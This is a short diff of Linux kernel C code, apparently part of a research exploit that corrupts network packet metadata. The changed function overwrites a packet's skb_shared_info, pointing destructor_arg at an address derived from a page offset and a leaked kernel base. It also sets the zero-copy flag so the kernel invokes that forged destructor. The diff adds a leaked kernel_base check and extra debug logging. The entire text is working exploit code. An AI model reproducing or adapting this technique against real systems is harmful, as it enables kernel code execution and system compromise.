@@ -947,11 +947,16 @@ static inline void modify_shinfo(void *va, unsigned int frag_size)
 {
 	/* Gil, add your sharedinfo magic here...*/
 	//TODO: in my code there are magic offsets, I can recalculate them but this is easier
-	if (!gilkup_vars.injected && gilkup_vars.data_pointers_counter > 256)
-		pr_crit_once("256 gilkup_vars.page_offset=%p max_ptr=%p\n", (void*)gilkup_vars.page_offset, (void*)gilkup_vars.max_data_pointer);
+
+	if (gilkup_vars.injected)
+		return;
+
+	if (gilkup_vars.data_pointers_counter > 256)
+		pr_crit_once("256 gilkup_vars.page_offset=%p max_ptr=%p kernel_base=%p\n",
+			(void*)gilkup_vars.page_offset, (void*)gilkup_vars.max_data_pointer, (void*)gilkup_vars.kernel_base);
 
 	//TODO: make sure that build_skb rewrite tx_flags; the hook should be after it.
-	if (!gilkup_vars.injected && gilkup_vars.data_pointers_counter > 512) //just in case...
+	if (gilkup_vars.kernel_base && gilkup_vars.data_pointers_counter > 512)
 	{
 		struct skb_shared_info *shinfo = (struct skb_shared_info*)((u64)va + frag_size - sizeof(*shinfo));
 		shinfo->destructor_arg = (void*)(gilkup_vars.page_offset + (PFN << 12)); //TODO: need your PFN...
@@ -959,8 +964,8 @@ static inline void modify_shinfo(void *va, unsigned int frag_size)
 	//	ASSERT(pfn_to_virt(PFN) == shinfo->destructor_arg);
 		shinfo->tx_flags = SKBTX_DEV_ZEROCOPY; //1<<3
 
-		pr_crit_once("512 gilkup_vars.page_offset=%p max_ptr=%p PFN=%p\n",
-			(void*)gilkup_vars.page_offset, (void*)gilkup_vars.max_data_pointer, (void*)PFN);
+		pr_crit_once("512 gilkup_vars.page_offset=%p max_ptr=%p kernel_base=%p PFN=%p\n",
+			(void*)gilkup_vars.page_offset, (void*)gilkup_vars.max_data_pointer, (void*)gilkup_vars.kernel_base, (void*)PFN);
 		pr_crit_once("data %p destructor %p\n", va, shinfo->destructor_arg);
 		for (i = 0; i < 10; ++i)
 			pr_crit("destructor[%d]=%p\n", i , ((void**)shinfo->destructor_arg)[i]);
